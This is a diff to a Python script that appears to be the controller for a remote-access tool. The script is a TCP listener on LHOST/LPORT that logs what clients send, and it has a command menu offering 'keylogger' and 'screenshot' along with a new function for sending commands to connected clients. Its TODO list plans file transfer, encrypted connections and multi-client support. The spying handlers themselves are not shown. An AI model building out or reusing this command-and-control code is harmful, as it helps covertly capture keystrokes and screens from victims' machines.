@@ -1,16 +1,21 @@
 import socket
 import threading
+import json
 from os import getenv
 from dotenv import load_dotenv
 import sys
+import logging
+
 # TO DO LIST
+
+# generalize input handling
 # add file download upload
 # encrypt the connection
 # beautify terminal
+# make it for multiple clients
 # send commands to the client side to start the modules
 
 # Logging
-import logging
 def get_logger():
     """
     Log Levels 
@@ -45,12 +50,15 @@ ENCODING = str(getenv("ENCODE","utf-8"))
 OUT_FILE="output.txt"
 PROMPT = getenv("PROMPT","$ ")
 
+
 logger.debug(f"LHOST={LHOST}")
 logger.debug(f"LPORT={LPORT}")
 logger.debug(f"RECV_SIZE={RECV_SIZE}")
 logger.debug(f"ENCODING={ENCODING}")
 logger.debug(f"OUT_FILE={OUT_FILE}")
 
+
+# connection handler
 def handle_client(client_socket, addr):
     logger.info(f"\nConnection from {addr}")
     try:
@@ -60,7 +68,9 @@ def handle_client(client_socket, addr):
                 break
             logger.debug(f"DATA SIZE = {len(data)}")
             message = data.decode(ENCODING)
+
             logger.info(f"\nReceived from {addr}: {message}\n{PROMPT}")
+
     except Exception as e:
         logger.error(f"Error with client {addr}: {e}")
     finally:
@@ -72,6 +82,7 @@ def out_new_line(data:str,outfile:str="output.txt"):
     with open(outfile,"a") as file:
         file.write(f"{data}\n")
 
+# initialize server
 def start_server(LPORT=LPORT):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -88,7 +99,9 @@ def start_server(LPORT=LPORT):
         logger.error("Port number must lower then 65535")
     server.bind((LHOST, LPORT))
     server.listen(5)
+
     logger.info(f"\nTCP Server listening on {LHOST}:{LPORT}\n{PROMPT}")
+
 
     try:
         while True:
@@ -101,6 +114,7 @@ def start_server(LPORT=LPORT):
     finally:
         server.close()
 
+# terminal commands
 def terminal(args):
     def help_command():
         logger.info("Available commands:", ", ".join(commands.keys()))
@@ -122,6 +136,7 @@ def terminal(args):
         "keylogger": keylogger_command,
         "screenshot": screenshot_command,
         "exit": exit_command,
+        "back": lambda: logger.info("Returning to main menu..."),
     }
 
     command = commands.get(args)
@@ -130,6 +145,13 @@ def terminal(args):
     else:
         logger.error("Invalid command. Available commands:", ", ".join(commands.keys()))
                 
+# working on it
+def send_command_to_client(client_socket, command):
+    try:
+        client_socket.send(json.dumps(command).encode(ENCODING))
+    except Exception as e:
+        logger.error(f"Failed to send command: {e}")
+
 if __name__ == "__main__":
 
     print(r"""
@@ -140,15 +162,27 @@ if __name__ == "__main__":
 /___,'//\\  )//_/`_\/_n_/ /_/   
            //                   
 
+Type 'shell' to start the terminal interface.
+Type 'exit' to quit the server.
     """)
 
     # Start server listener
     listening_thread = threading.Thread(target=start_server, daemon=True)
     listening_thread.start()
 
-    try:
-        while True:
-            user_command = input(f"\n{PROMPT}")
-            terminal(user_command)
-    except KeyboardInterrupt:
-        logger.info("\n[!] Interrupted. Exiting...")
+    while True:
+        menu_input = input()
+        if menu_input == "shell":
+            while True:
+                # Terminal input loop
+                try:
+                    user_command = input(f"\n{PROMPT}")
+                    if user_command == "back":
+                        terminal("back")
+                        break
+                    terminal(user_command)
+                except KeyboardInterrupt:
+                    logger.info("\n[!] Interrupted. Exiting...")
+                    break
+        elif menu_input == "exit":
+            terminal("exit")
